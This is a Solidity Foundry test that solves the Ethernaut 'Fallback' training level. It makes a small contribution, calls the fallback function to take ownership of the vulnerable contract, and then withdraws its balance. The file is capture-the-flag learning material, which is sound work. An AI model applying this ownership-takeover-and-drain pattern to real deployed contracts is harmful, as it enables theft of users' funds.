pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/levels/Fallback/FallbackFactory.sol";
import "../src/core/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // (...)

        // contribute 1 wei - verify contract state has been updated
        ethernautFallback.contribute{value: 1 wei}();
        assertEq(ethernautFallback.contributions(attacker), 1 wei);

        // Call the contract with some value to hit the fallback function - .transfer doesn't send with enough gas to change the owner state
        payable(address(ethernautFallback)).call{value: 1 wei}("");

        // Verify contract owner has been update to 0 address
        assertEq(ethernautFallback.owner(), attacker);

        // Withdraw from contract - Check contract balance before and after
        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);

        ethernautFallback.withdraw();

        emit log_named_uint("Fallback contract balance", address(ethernautFallback).balance);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////


        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
